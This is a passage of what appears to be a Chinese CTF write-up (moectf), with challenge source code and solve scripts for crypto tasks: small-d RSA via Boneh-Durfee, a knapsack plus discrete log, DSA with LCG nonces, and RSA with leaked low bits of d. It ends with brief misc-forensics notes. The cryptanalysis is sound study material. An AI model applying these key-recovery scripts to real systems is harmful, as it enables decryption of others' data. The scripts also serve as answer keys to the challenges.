class="params">nbits,dbits</span>):</span><br><span class="line">    p = getStrongPrime(nbits//<span class="number">2</span>)</span><br><span class="line">    q = getStrongPrime(nbits//<span class="number">2</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = random.getrandbits(dbits)</span><br><span class="line">        <span class="keyword">if</span> d.bit_length() == dbits:</span><br><span class="line">            <span class="keyword">if</span> GCD(d, phi) == <span class="number">1</span>:</span><br><span class="line">                e = inverse(d, phi)</span><br><span class="line">                pk = (n, e)</span><br><span class="line">                sk = (p, q, d)</span><br><span class="line">                <span class="keyword">return</span> pk, sk</span><br><span class="line"></span><br><span class="line">nbits = <span class="number">1024</span></span><br><span class="line">dbits = <span class="number">258</span></span><br><span class="line">message = pad(flag,<span class="number">16</span>)</span><br><span class="line">msg = pad(message, <span class="number">16</span>)</span><br><span class="line">m = bytes_to_long(msg)</span><br><span class="line">pk= genKey(nbits, dbits)[<span class="number">0</span>]</span><br><span class="line">n, e = pk</span><br><span class="line">ciphertext = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;pk = <span class="subst">&#123;pk&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;ciphertext = <span class="subst">&#123;ciphertext&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line">pk = (<span class="number">134133840507194879124722303971806829214527933948661780641814514330769296658351734941972795427559665538634298343171712895678689928571804399278111582425131730887340959438180029645070353394212857682708370490223871309129948337487286534021548834043845658248447393803949524601871557448883163646364233913283438778267</span>, <span class="number">83710839781828547042000099822479827455150839630087752081720660846682103437904198705287610613170124755238284685618099812447852915349294538670732128599161636818193216409714024856708796982283165572768164303554014943361769803463110874733906162673305654979036416246224609509772196787570627778347908006266889151871</span>)</span><br><span class="line">ciphertext = <span class="number">73228838248853753695300650089851103866994923279710500065528688046732360241259421633583786512765328703209553157156700672911490451923782130514110796280837233714066799071157393374064802513078944766577262159955593050786044845920732282816349811296561340376541162788570190578690333343882441362690328344037119622750</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>&lt;</mo><msup><mi>N</mi><mn>0.292</mn></msup></mrow><annotation encoding="application/x-tex">d&lt;N^{0.292}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">.</span><span class="mord mtight">2</span><span class="mord mtight">9</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><br /><code>Boneh Durfee Attack</code><br /><a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage">https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">N,e = (<span class="number">134133840507194879124722303971806829214527933948661780641814514330769296658351734941972795427559665538634298343171712895678689928571804399278111582425131730887340959438180029645070353394212857682708370490223871309129948337487286534021548834043845658248447393803949524601871557448883163646364233913283438778267</span>, <span class="number">83710839781828547042000099822479827455150839630087752081720660846682103437904198705287610613170124755238284685618099812447852915349294538670732128599161636818193216409714024856708796982283165572768164303554014943361769803463110874733906162673305654979036416246224609509772196787570627778347908006266889151871</span>)</span><br><span class="line">ciphertext = <span class="number">73228838248853753695300650089851103866994923279710500065528688046732360241259421633583786512765328703209553157156700672911490451923782130514110796280837233714066799071157393374064802513078944766577262159955593050786044845920732282816349811296561340376541162788570190578690333343882441362690328344037119622750</span></span><br><span class="line">d = <span class="number">420129172617694367639603712165881242192973923283572937883375494685279140840871</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(ciphertext,d,N))).decode())</span><br></pre></td></tr></table></figure><h2 id="ezmatrix"><a class="markdownIt-Anchor" href="#ezmatrix"></a> EzMatrix()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG,secrets,SECERT_T</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(secrets) == <span class="number">16</span></span><br><span class="line"><span class="keyword">assert</span> FLAG == <span class="string">b&#x27;moectf&#123;&#x27;</span> + secrets + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(SECERT_T) &lt;= <span class="number">127</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LFSR</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self._s = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">list</span>(<span class="string">&quot;&#123;:0128b&#125;&quot;</span>.<span class="built_in">format</span>(bytes_to_long(secrets)))))</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>*<span class="built_in">len</span>(secrets)):</span><br><span class="line">            self.clock()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clock</span>(<span class="params">self</span>):</span><br><span class="line">        b = self._s[<span class="number">0</span>]</span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> SECERT_T:c ^= self._s[t]</span><br><span class="line">        self._s = self._s[<span class="number">1</span>:] + [c]</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">self, length</span>):</span><br><span class="line">        <span class="keyword">return</span> [self.clock() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length)]</span><br><span class="line"></span><br><span class="line">c = LFSR()</span><br><span class="line">stream = c.stream(<span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,stream))[:-<span class="number">5</span>])</span><br><span class="line"><span class="comment"># 11111110011011010000110110100011110110110101111000101011001010110011110011000011110001101011001100000011011101110000111001100111011100010111001100111101010011000110110101011101100001010101011011101000110001111110100000011110010011010010100100000000110</span></span><br></pre></td></tr></table></figure><p>好，<code>LFSR</code>不太会</p><h2 id="ezpack"><a class="markdownIt-Anchor" href="#ezpack"></a> EzPack</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">p = <span class="number">2050446265000552948792079248541986570794560388346670845037360320379574792744856498763181701382659864976718683844252858211123523214530581897113968018397826268834076569364339813627884756499465068203125112750486486807221544715872861263738186430034771887175398652172387692870928081940083735448965507812844169983643977</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">42</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bin</span>(bytes_to_long(msg))[<span class="number">2</span>:].zfill(<span class="number">8</span>*<span class="built_in">len</span>(msg))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params"><span class="built_in">len</span></span>):</span><br><span class="line">    sums = <span class="number">0</span></span><br><span class="line">    keys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        k = random.randint(<span class="number">1</span>,<span class="number">7777</span>)</span><br><span class="line">        x = sums + k</span><br><span class="line">        keys.append(x)</span><br><span class="line">        sums += x</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line">key = genkey(<span class="number">42</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">m, keys</span>):</span><br><span class="line">    msg = encode(m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(keys))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(msg))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(msg) == <span class="built_in">len</span>(keys)</span><br><span class="line">    s = <span class="built_in">sum</span>((k <span class="keyword">if</span> (<span class="built_in">int</span>(p,<span class="number">2</span>) == <span class="number">1</span>) <span class="keyword">else</span> <span class="number">1</span>) <span class="keyword">for</span> p, k <span class="keyword">in</span> <span class="built_in">zip</span>(msg, keys))</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="keyword">for</span> p0,k <span class="keyword">in</span> <span class="built_in">zip</span>(msg,keys):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">int</span>(p0,<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(<span class="number">7</span>,s,p)</span><br><span class="line"></span><br><span class="line">cipher = enc(flag,key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    fs.write(<span class="built_in">str</span>(key)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    fs.write(<span class="built_in">str</span>(cipher))</span><br></pre></td></tr></table></figure><p>离散对数问题<code>DLP</code>+<code>超递增背包密码</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">1210552586072154479867426776758107463169244511186991628141504400199024936339296845132507655589933479768044598418932176690108379140298480790405551573061005655909291462247675584868840035141893556748770266337895571889128422577613223452797329555381197215533551339146807187891070847348454214231505098834813871022509186</span></span><br><span class="line">key = [...]</span><br><span class="line">p = <span class="number">2050446265000552948792079248541986570794560388346670845037360320379574792744856498763181701382659864976718683844252858211123523214530581897113968018397826268834076569364339813627884756499465068203125112750486486807221544715872861263738186430034771887175398652172387692870928081940083735448965507812844169983643977</span></span><br><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="comment"># R = GF(p)</span></span><br><span class="line"><span class="comment"># s = R(c).log(R(7))</span></span><br><span class="line">s = <span class="number">363965742933281351259442199216117822475210003294088371760914916341815880641228470807683148775152284520244</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key[::-<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">if</span> i &lt;= s:</span><br><span class="line">        flag += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        s -= i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        s -= <span class="number">1</span></span><br><span class="line">flag = flag[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(flag[i:i+<span class="number">8</span>], <span class="number">2</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="ezlcg"><a class="markdownIt-Anchor" href="#ezlcg"></a> ezLCG()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits, randint</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,isPrime,inverse</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> priKey, flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">q = getPrime(<span class="number">160</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t0 = q*getrandbits(<span class="number">864</span>)</span><br><span class="line">    <span class="keyword">if</span> isPrime(t0+<span class="number">1</span>):</span><br><span class="line">        p = t0 + <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">x = priKey</span><br><span class="line"><span class="keyword">assert</span> p % q == <span class="number">1</span></span><br><span class="line">h = randint(<span class="number">1</span>,p-<span class="number">1</span>)</span><br><span class="line">g = <span class="built_in">pow</span>(h,(p-<span class="number">1</span>)//q,p)</span><br><span class="line">y = <span class="built_in">pow</span>(g,x,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">z, k</span>):</span><br><span class="line">    r = <span class="built_in">pow</span>(g,k,p) % q</span><br><span class="line">    s = (inverse(k,q)*(z+r*priKey)) % q</span><br><span class="line">    <span class="keyword">return</span> (r,s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">m,s,r</span>):</span><br><span class="line">    z = <span class="built_in">int</span>.from_bytes(sha1(m).digest(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    u1 = (inverse(s,q)*z) % q</span><br><span class="line">    u2 = (inverse(s,q)*r) % q</span><br><span class="line">    r0 = ((<span class="built_in">pow</span>(g,u1,p)*<span class="built_in">pow</span>(y,u2,p)) % p) % q</span><br><span class="line">    <span class="keyword">return</span> r0 == r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcg</span>(<span class="params">a, b, q, x</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = (a * x + b) % q</span><br><span class="line">        <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line">msg = [os.urandom(<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">a, b, x = [randbelow(q) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">prng = lcg(a, b, q, x)</span><br><span class="line">sigs = []</span><br><span class="line"><span class="keyword">for</span> m, k <span class="keyword">in</span> <span class="built_in">zip</span>(msg,prng):</span><br><span class="line">    z = <span class="built_in">int</span>.from_bytes(sha1(m).digest(), <span class="string">&quot;big&quot;</span>) % q</span><br><span class="line">    r, s = sign(z, k)</span><br><span class="line">    <span class="keyword">assert</span> verify(m, s, r)</span><br><span class="line">    sigs.append((r,s))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;g = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;h = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;q = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;msg = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;sigs = &#125;</span>&quot;</span>)</span><br><span class="line">key = sha1(<span class="built_in">str</span>(priKey).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC,iv)</span><br><span class="line">ct = cipher.encrypt(pad(flag,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;iv = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">g = 81569684196645348869992756399797937971436996812346070571468655785762437078898141875334855024163673443340626854915520114728947696423441493858938345078236621180324085934092037313264170158390556505922997447268262289413542862021771393535087410035145796654466502374252061871227164352744675750669230756678480403551</span></span><br><span class="line"><span class="string">h = 13360659280755238232904342818943446234394025788199830559222919690197648501739683227053179022521444870802363019867146013415532648906174842607370958566866152133141600828695657346665923432059572078189013989803088047702130843109809724983853650634669946823993666248096402349533564966478014376877154404963309438891</span></span><br><span class="line"><span class="string">q = 1303803697251710037027345981217373884089065173721</span></span><br><span class="line"><span class="string">p = 135386571420682237420633670579115261427110680959831458510661651985522155814624783887385220768310381778722922186771694358185961218902544998325115481951071052630790578356532158887162956411742570802131927372034113509208643043526086803989709252621829703679985669846412125110620244866047891680775125948940542426381</span></span><br><span class="line"><span class="string">msg = [b&#x27;I\xf0\xccy\xd5~\xed\xf8A\xe4\xdf\x91+\xd4_$&#x27;, b&#x27;~\xa0\x9bCB\xef\xc3SY4W\xf9Aa\rO&#x27;, b&#x27;\xe6\x96\xf4\xac\n9\xa7\xc4\xef\x82S\xe9 XpJ&#x27;, b&#x27;3,\xbb\xe2-\xcc\xa1o\xe6\x93+\xe8\xea=\x17\xd1&#x27;, b&#x27;\x8c\x19PHN\xa8\xbc\xfc\xa20r\xe5\x0bMwJ&#x27;]</span></span><br><span class="line"><span class="string">sigs = [(913082810060387697659458045074628688804323008021, 601727298768376770098471394299356176250915124698), (406607720394287512952923256499351875907319590223, 946312910102100744958283218486828279657252761118), (1053968308548067185640057861411672512429603583019, 1284314986796793233060997182105901455285337520635), (878633001726272206179866067197006713383715110096, 1117986485818472813081237963762660460310066865326), (144589405182012718667990046652227725217611617110, 1028458755419859011294952635587376476938670485840)]</span></span><br><span class="line"><span class="string">iv = b&#x27;M\xdf\x0e\x7f\xeaj\x17PE\x97\x8e\xee\xaf:\xa0\xc7&#x27;</span></span><br><span class="line"><span class="string">ct = b&quot;\xa8a\xff\xf1[(\x7f\xf9\x93\xeb0J\xc43\x99\xb25:\xf5&gt;\x1c?\xbd\x8a\xcd)i)\xdd\x87l1\xf5L\xc5\xc5&#x27;N\x18\x8d\xa5\x9e\x84\xfe\x80\x9dm\xcc&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="babe-lifting"><a class="markdownIt-Anchor" href="#babe-lifting"></a> babe-Lifting</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">bit_leak = <span class="number">400</span></span><br><span class="line">d_leak = d &amp; ((<span class="number">1</span>&lt;&lt;bit_leak)-<span class="number">1</span>)</span><br><span class="line">msg = bytes_to_long(flag)</span><br><span class="line">cipher = <span class="built_in">pow</span>(msg,e,n)</span><br><span class="line">pk = (n, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;pk = <span class="subst">&#123;pk&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;cipher = <span class="subst">&#123;cipher&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;hint = <span class="subst">&#123;d_leak&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line">pk = (<span class="number">53282434320648520638797489235916411774754088938038649364676595382708882567582074768467750091758871986943425295325684397148357683679972957390367050797096129400800737430005406586421368399203345142990796139798355888856700153024507788780229752591276439736039630358687617540130010809829171308760432760545372777123</span>, <span class="number">4097</span>)</span><br><span class="line">cipher = <span class="number">14615370570055065930014711673507863471799103656443111041437374352195976523098242549568514149286911564703856030770733394303895224311305717058669800588144055600432004216871763513804811217695900972286301248213735105234803253084265599843829792871483051020532819945635641611821829176170902766901550045863639612054</span></span><br><span class="line">hint = <span class="number">1550452349150409256147460237724995145109078733341405037037945312861833198753379389784394833566301246926188176937280242129</span></span><br></pre></td></tr></table></figure><p><code>d_leak = d &amp; ((1&lt;&lt;bit_leak)-1)</code>，泄露<code>d</code>的低400位<br />参考<a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/">https://lazzzaro.github.io/2020/05/06/crypto-RSA/</a> <code>La佬</code>的脚本，一开始以为没跑出来是有问题的，结果复盘发现，原来大家都要跑10来分钟呢，QWQ<br />当然给的论文我也没看懂</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partial_p</span>(<span class="params">p0, kbits, n</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.4</span>)  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.4</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p</span>(<span class="params">d0, kbits, e, n</span>):</span><br><span class="line">    X = var(<span class="string">&#x27;X&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p <span class="keyword">and</span> p != <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n, e = (<span class="number">53282434320648520638797489235916411774754088938038649364676595382708882567582074768467750091758871986943425295325684397148357683679972957390367050797096129400800737430005406586421368399203345142990796139798355888856700153024507788780229752591276439736039630358687617540130010809829171308760432760545372777123</span>, <span class="number">4097</span>)</span><br><span class="line">    c = <span class="number">14615370570055065930014711673507863471799103656443111041437374352195976523098242549568514149286911564703856030770733394303895224311305717058669800588144055600432004216871763513804811217695900972286301248213735105234803253084265599843829792871483051020532819945635641611821829176170902766901550045863639612054</span></span><br><span class="line">    d0 = <span class="number">1550452349150409256147460237724995145109078733341405037037945312861833198753379389784394833566301246926188176937280242129</span></span><br><span class="line">    beta = <span class="number">0.5</span></span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = d0.nbits()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;lower %d bits (of %d bits) is given&quot;</span> % (kbits, nbits))</span><br><span class="line">    p = <span class="built_in">int</span>(find_p(d0, kbits, e, n))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;found p: %d&quot;</span> % p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found!&quot;</span>)</span><br><span class="line">    q = n//<span class="built_in">int</span>(p)</span><br><span class="line">    d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))).decode())</span><br></pre></td></tr></table></figure><p>论文：<a href="https://www.ams.org/notices/199902/boneh.pdf">https://www.ams.org/notices/199902/boneh.pdf</a></p><h2 id="hidden-poly"><a class="markdownIt-Anchor" href="#hidden-poly"></a> hidden-poly()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">q = <span class="number">264273181570520944116363476632762225021</span></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">root = <span class="number">122536272320154909907460423807891938232</span></span><br><span class="line">f = <span class="built_in">sum</span>([a*root**i <span class="keyword">for</span> i,a <span class="keyword">in</span> <span class="built_in">enumerate</span>(key)])</span><br><span class="line"><span class="keyword">assert</span> key.isascii()</span><br><span class="line"><span class="keyword">assert</span> f % q == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key,AES.MODE_CBC, iv)</span><br><span class="line">ciphertext = cipher.encrypt(pad(flag,<span class="number">16</span>)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;<span class="subst">&#123;iv = &#125;</span>&quot;</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;<span class="subst">&#123;ciphertext = &#125;</span>&quot;</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">iv = <span class="string">b&#x27;Gc\xf2\xfd\x94\xdc\xc8\xbb\xf4\x84\xb1\xfd\x96\xcd6\\&#x27;</span></span><br><span class="line">ciphertext = <span class="string">&#x27;d23eac665cdb57a8ae7764bb4497eb2f79729537e596600ded7a068c407e67ea75e6d76eb9e23e21634b84a96424130e&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="罗小黑战记"><a class="markdownIt-Anchor" href="#罗小黑战记"></a> 罗小黑战记</h2><p>一张<code>gif</code>动图，直接用<code>ToolsFx</code>的图片模块进行处理，最后扫码</p><h2 id="杂项入门指北"><a class="markdownIt-Anchor" href="#杂项入门指北"></a> 杂项入门指北</h2><p>海报发现摩斯电码<code>.... ....- ...- . ..--.- .- ..--.- --. ----- ----- -.. ..--.- - .---- -- .</code></p><h2 id="ez_forensics"><a class="markdownIt-Anchor" href="#ez_forensics"></a> ez_Forensics</h2><p><code>cmdscan：可用于查看终端记录</code><br /><code>vol.py -f flag.raw --profile=Win7SP1x64 cmdscan</code></p><h2 id="so-many-m"><a class="markdownIt-Anchor" href="#so-many-m"></a> so many ‘m’</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 